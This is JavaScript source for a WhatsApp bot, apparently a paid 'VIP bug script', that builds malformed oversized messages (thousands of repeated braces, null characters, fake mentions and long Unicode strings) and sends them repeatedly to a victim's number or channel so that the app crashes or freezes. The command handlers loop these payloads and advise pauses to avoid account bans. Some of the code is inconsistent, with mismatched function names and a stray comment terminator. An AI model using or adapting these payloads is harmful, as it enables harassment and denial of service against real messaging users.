  await justinn.relayMsg("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget } }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    const message = {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: {
                is_status_mention: "true"
              }
            }
          ]
        }
      }
    };
    await justinn.relayMsg(isTarget, message, {});
  }
    console.log('ðŸ©¸Proses Pengiriman Bug Fc Invis Mentions DoneðŸ”¥')
}

async function JustinDelay(isTarget) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "JustinOffc",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "JustinOffc",
                address: "JustinOffc",
              },
            },
            body: {
              text: "JustinOffc",
            },
            nativeFlowMessage: {
              messageParamshtml: "{".repeat(10000),
            },
            contextInfo: {
              participant: isTarget,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await justinn.relayMsg(isTarget, message, {
      messageId: null,
      participant: { jid: isTarget },
      userJid: isTarget,
    });
  } catch (err) {
    console.log(err);
  }
    console.log('ðŸ©¸Proses Pengiriman Bug Delay Invisible DoneðŸ”¥')
}

async function wraperOsCards(isTarget, rep, mention) {
  const space = "{".repeat(rep)
  const PrM = await prepareWAMessageMedia(
    { image: peler },
    { upload: justinn.waUploadToServer }
  );

  const cardsCrL = Array.from({ length: 10 }, () => ({
    header: {
      imageMessage: PrM.imageMessage,
      hasMediaAttachment: true
    },
    nativeFlowMessage: {
      messageParamshtml: space
    }
  }));

  const messagePayload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "ðŸ©¸ YT JustinOfficial-ID " },
          carouselMessage: {
            cards: cardsCrL,
            messageVersion: 1
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messagePayload, {});

  await justinn.relayMsg("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget } }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    const message = {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: {
                is_status_mention: "true"
              }
            }
          ]
        }
      }
    };
    await justinn.relayMsg(isTarget, message, {});
  }

  console.log(chalk.red("ðŸ©¸Success Sending Forclose Invisible"));
}



//DELAY MAKER
async function DelayCrash(isTarget, mention) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "ðŸ©¸ YT JustinOfficial-ID",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "Justin Official",
            paramshtml: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "Information Script Justin",
              newsletterJid: "120363373003239606@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await justinn.relayMsg("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await justinn.relayMsg(isTarget, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "JustinOffcBOT" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
  console.log(chalk.red("ðŸ©¸Success Sending Delay Crash Bug"));
}

async function Crash(target, Ptcp = true) {
    await justinn.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "p",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramshtml: "ê§”ê§ˆ".repeat(9000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}
const Qcrl = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    interactiveMessage: {
      body: { 
        title: "", 
        text: "\u0000".repeat(1000000),
        footer: "",
        description: ""
      },
      carouselMessage: {
        cards: []
      },
      contextInfo: {
        mentionedJid: ["status@broadcast"]
      }
    }
  }
};

async function CrashInvis(target, Ptcp = true) {
    await justinn.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "p",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramshtml: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}

 async function iosinvis(justinn, X) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "Than XS" + "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(15000),
         address: "Than XS" + "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(5000),
         url: `https://than.example.${"ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "ðŸ©¸ YT JustinOfficial-ID",
            matchedText: "https://t.me/justinoffc",
            description: "than xs".repeat(15000),
            title: "than xs" + "than xs".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await justinn.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await justinn.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

async function CrlSqL(isTarget) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./start/piw.mp4") },
    { upload: justinn.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "FnX-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "ðŸ©¸ YT JustinOfficial-ID ",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Finix AI Broadcast",
              body: "Trusted System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamshtml: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ðŸ©¸ YT JustinOfficial-ID "
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "FnX" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "Finix Engine",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://finix-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await justinn.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}

 
        
const bugres = 'Wait, Proses Mengirim Bug Mungkin Akan Memakan Waktu Selama 5Menit Sampai 10Menit\n\n> Target Akan Mengalami Crash/Forclose Jika Waktu Pengiriman Telah Selesai!...'
//=============== CASE ================//
switch (command) {
case 'bug':
case 'buy':
case 'sc':
case 'dev':
case 'developer':
case 'buysc':
case 'own':
case 'script': {
justinn.sendMsg(from, {react: {text: "ðŸ©¸", key: m.key}})
let menu = `*Script Versi Vip* , Hubungi Dev Atau Yang Bersangkutan Dengan Justin, Hindari Trx Dngan Org Lain, Agar Tidak Terkena Penipuan!

- V20 Via Telegram 75K
- V20 Via WhatsApp 55K`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: `Information Script Justin`,
 newsletterJid: "120363373003239606@newsletter",
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: justinn.decodeJid(justinn.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: menu
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "Developer JustinOfficial"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: loveu }, { upload: justinn.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
"name": "cta_url",
"buttonParamshtml": `{\"display_text\":\"Kontak Justin\",\"url\":\"https://wa.me/6285176915043\",\"merchant_url\":\"https://wa.me/6285176915043\"}`
},
{
"name": "cta_url",
"buttonParamshtml": `{\"display_text\":\"Saluran Utama Justin\",\"url\":\"https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g\",\"merchant_url\":\"https://wa.me/6285176915043\"}`
},
{
"name": "cta_url",
"buttonParamshtml": `{\"display_text\":\"Saluran Kedua Justin\",\"url\":\"https://whatsapp.com/channel/0029VbB5UQdGE56grPRZ6e13/\",\"merchant_url\":\"https://wa.me/6283148534432\"}`
}],
 })
 })
 }
 }
}, {})

await justinn.relayMsg(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
await justinn.sendMsg(m.chat, { audio: { url: `https://files.catbox.moe/309zyo.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break;
            

case 'tools': {
    if (isBan) return
    let peler = `ã“ã‚“ã«ã¡ã¯ã§ã™ã‚·ã‚¹ãƒ†ãƒ ã‚¦ã‚¤ãƒ«ã‚¹ã‚’ä½¿ç”¨ã—ã¦ã‚ãªãŸã‚’åŠ©ã‘ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸãƒœãƒƒãƒˆã§ã™åŠ©ã‘ã‚‹ã€‚
 
*- è¨ˆã• FITUR MAIN TOOLS*
 âŒ¬ Brat
 âŒ¬ Tourl
 âŒ¬ Cekidch 
 âŒ¬ Hd
 âŒ¬ Remini 
 âŒ¬ Tiktok
 âŒ¬ Instagram 
 âŒ¬ Play
 âŒ¬ Youtube
 âŒ¬ Antilink
 âŒ¬ Facebook
 âŒ¬ Ytmp3
 âŒ¬ Ytmp4
 âŒ¬ Tiktokmp3
 âŒ¬ Tiktokmp4
 âŒ¬ Plays
 âŒ¬ Rvo
 âŒ¬ Getsw
 âŒ¬ Chatgpt
 âŒ¬ Enchard
 âŒ¬ Banchat
 âŒ¬ Unbanchat
 âŒ¬ Toimg
 âŒ¬ Tovn
 âŒ¬ Quoted
 âŒ¬ Nsfw
 âŒ¬ Tovocal
 âŒ¬ Pinterest
 âŒ¬ Pinvid
`
    justinn.sendMsg(m.chat, {
        text: peler,
        footer: "Developer JustinOfficial",
        buttons: [       
            {
                buttonId: '.sc',
                buttonText: {
                    displayText: 'Buy Script Vip' },
                type: 1,
            },
            {     
                buttonId: '.menu',
                buttonText: { displayText: 'Back' },
                type: 1,
            }
        ],
        headerType: 1,
        viewOnce: true,
    }, { quoted: catalems })
}
break;

case 'testsd':
case 'inwhsv':
case 'desbshy':
case 'delsbbsa': {
if (!isPremium) return reply('Khusus User Premium')
if (!q) return reply(`Example: ${prefix + command} 62Ã—Ã—Ã—`)
let isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 5; i++) {
await infinity(isTarget)
}
reply(`Pengiriman Bug Telah Selesai\n\n- Version : 20 Fase2\n- Status : Vip Buy Only!!\n> Warning!!, Gunakan Jeda Setelah Pemakaian, Jeda Selama 10-15 Menit Agar Tidak Mudah Kenon!!`)
}
break
     
case 'fcinvis2':
case 'forclose2': {
if (!isPremium) return reply('Khusus User Premium')
if (!q) return reply(`Example: ${prefix + command} 62Ã—Ã—Ã—`)
let isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 20; i++) {
await wraperOsCards(isTarget, 10000, false)
    await sleep(2000)
}
reply(`Pengiriman Bug Telah Selesai\n\n- Version : 20 Fase2\n- Status : Vip Buy Only!!\n> Warning!!, Gunakan Jeda Setelah Pemakaian, Jeda Selama 10-15 Menit Agar Tidak Mudah Kenon!!`)
}
break

case 'delayinvis':
case 'invisdelay': {
if (!isPremium) return reply('Khusus User Premium')
if (!q) return reply(`Example: ${prefix + command} 62Ã—Ã—Ã—`)
let isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 55; i++) {
await wraperOsCards(isTarget, 10000, false)
    await sleep(1000)
    await wraperOsCards(isTarget, 10000, false)
    await sleep(1000)
    await DelayCrash(isTarget)
    await sleep(1000)
    await invisCrL(isTarget)
    await sleep(1000)
}
reply(`Pengiriman Bug Telah Selesai\n\n- Version : 20 Fase2\n- Status : Vip Buy Only!!\n> Warning!!, Gunakan Jeda Setelah Pemakaian, Jeda Selama 10-15 Menit Agar Tidak Mudah Kenon!!`)
}
break


case 'wraperoscards':
case 'forclose':
case 'Izalcs':
case 'Izalfcbos':
case 'propovers':
case 'infinity': {
if (!isPremium) return reply('Khusus User Premium')
if (!q) return reply(`Example: ${prefix + command} 62Ã—Ã—Ã—`)
let isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 10; i++) {
await infinityThan(justinn, isTarget);
await infinityThan(justinn, isTarget);
await CrlSqL(justinn, isTarget);
}
reply(`Pengiriman Bug Telah Selesai\n\n- Version : 20 Fase2\n- Status : Vip Buy Only!!\n> Warning!!, Gunakan Jeda Setelah Pemakaian, Jeda Selama 10-15 Menit Agar Tidak Mudah Kenon!!`)
}
break
        
case 'ipinvis':
case 'iosinvis': {
if (!isPremium) return reply('Khusus User Premium')
if (!q) return reply(`Example: ${prefix + command} 62Ã—Ã—Ã—`)
let isTarget = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 10; i++) {
await iosinvis(justinn, isTarget);
}
reply(`Pengiriman Bug Telah Selesai\n\n- Version : 20 Fase2\n- Status : Vip Buy Only!!\n> Warning!!, Gunakan Jeda Setelah Pemakaian, Jeda Selama 10-15 Menit Agar Tidak Mudah Kenon!!`)
}
break
        
case 'kill-gc':
case "x-grup": {
    if (!Access && !isPremium) return reply("Khusus Premium ");
   /* if (!text || !text.includes("chat.whatsapp.com")) {
        return reply("Kirim link grup WhatsApp\nContoh: .kill-gc https://chat.whatsapp.com/xxx");
    }
    let linkgc = text.trim();
    let code = linkgc.split("https://chat.whatsapp.com/")[1];
    if (!code) return reply("âš ï¸ Link grup tidak valid!");
    // Join dulu ke grup target
    let res = await justinn.groupAcceptInvite(code).catch(e => reply("yahh gagal join grup!"));
    // Dapatkan ID grup dari hasil join
    let target = res; // Format: 120xxxxxxxx@g.us
    // Kirim notif awal
    await justinn.sendMsg(m.chat, { text: `Berhasil Masuk Dan Mengirim Fungsi ${target}` });

    // Kirim bug ke grup target
    await justinn.sendMsg(target, {
        text: "ðŸ©¸YT : JustinOfficial-ID",
        contextInfo: {
            externalAdReply: {
                title: "Crash Kill Grup",
                body: "Developer Justin",
                sourceUrl: "https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g",
            },
        },
    });

    // Spam ke grup target (loop ringan biar ga kena rate limit)
    for (let i = 0; i < 5; i++) {
  await Caraousel(target, ptcp = true);
  await Caraousel(target);
  await Caraousel(target, true);
        await sleep(1200);
    }

    reply("Done Attack Grup By Justin ðŸ©¸");*/
    reply("ðŸ‘» Mohon Maaf Fitur ini sedang dalam masa uji coba!");
    
}
break;
        
case "kill-saluran": {
    if (!isPremium) return reply("Akses Ditolak!!");
    const targetChannel = args[0]; // ID Channel (contoh: "123456789101112@broadcast")
    if (!targetChannel) {
        return Justinnreply(`Example :.${command} 123456789101112@broadcast`);
    }
    // Kirim pesan awal proses
    await justinn.sendMsg(m.chat, {
    image: { url: "https://files.catbox.moe/uaaunf.jpg" },
      caption: "Proses Mengirim Bug Channel",
    });

    const total = 2000;

    for (let i = 0; i < total; i++) {
        try {
            await CrashJids(targetChannel);

            if (i === 10) {
                // Kirim pesan progress setelah beberapa iterasi
                await justinn.sendMsg(m.chat, {
                    text: `Prosess... (${i}/${total})`,
                });
            }
        } catch (error) {
            console.error("âŒ Gagal Mengirim", error);
            return Justinnreply("Erorr: Gunakan Id Saluran");
        }
        await sleep(1000); // Jeda agar tidak overload
    }

    // Kirim pesan selesai
    await justinn.sendMessge(m.chat, {
        image: { url: "https://files.catbox.moe/j0hsm5.jpg" },
        caption: "Sukses Mengirim Bug Chanel",
        contextInfo: {
            externalAdReply: {
                title: "YT : JustinOfficial-ID",
                body: "BÃ­t.ly/JustinOfficial",
                sourceUrl: "https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g",
            },
        },
    });

    Justinnreply("Attack Selesai, Gunakan Jeda!"); */
     reply("ðŸ‘» Mohon Maaf Fitur ini sedang dalam masa uji coba!");
}
break;

    
case 'menu': case "p": {
const tampilan = `ã“ã‚“ã«ã¡ã¯ã§ã™ã‚·ã‚¹ãƒ†ãƒ ã‚¦ã‚¤ãƒ«ã‚¹ã‚’ä½¿ç”¨ã—ã¦ã‚ãªãŸã‚’åŠ©ã‘ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸãƒœãƒƒãƒˆã§ã™åŠ©ã‘ã‚‹ã‚ãªãŸã€‚ 
  
*- è¨ˆã• INFORMATION BOT*
 âŒ¬ Botname : JustinOffc
 âŒ¬ Version : 20.0.2 Fase2
 âŒ¬ Mode : *Self* Mode
 âŒ¬ Status : Vip Buy Onlyy!!`
let buttons = [
        { buttonId: ".sc", buttonText: { displayText: "Buy Versi Tele" }, type: 1 },
        
        
    ];
    let buttonMessage = {
    image: { url: `https://files.catbox.moe/9id6oh.jpg` },
gifPlayback: false,
caption: tampilan,
contextInfo: {
externalAdReply: {
title: 'JustinV20 Fase2',
                    body: 'Tiktok : JustinOfficial',
                    showAdAttribution: true,
                    thumbnailUrl: `https://files.catbox.moe/r14cz4.jpg`,
                    mediaType: 4,
                    MediaUrl: 'www.tiktok.com/@justinandiar',
                    sourceUrl: "www.tiktok.com/@justinandiar",
                }
            },    
        footer: "Developer JustinOfficial",
        buttons: buttons,
        viewOnce: true,
         headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramshtml: html.stringify({
                title: "Show All Fitur",
                sections: [
                    {
          title: "Fitur Utama Script Justin",
          highlight_label: "Populer",
                rows: [
        { title: "Bug Menu", description: "Menampilkan Semua Fitur Bug", id: ".bugmenu" }
                      ]
                      },
                      {
          title: "Bagian Fitur Akses Owner",
          highlight_label: "Akses Owner",
          rows: [
        { title: "Owner Menu", description: "Menampilkan Fitur Owner", id: ".ownermenu" },
        { title: "Tools", description: "Fitur Main Tools", id: ".tools" }   
                      ]
                    },
                    {
          title: "All Name Partner Justin",
          highlight_label: "Support Justin",
          rows: [
        { title: "Best Friends", description: "Partner Justin", id: ".ptjustin" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];

// Tambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan
await justinn.sendMsg(m.chat, buttonMessage, { quoted: m });
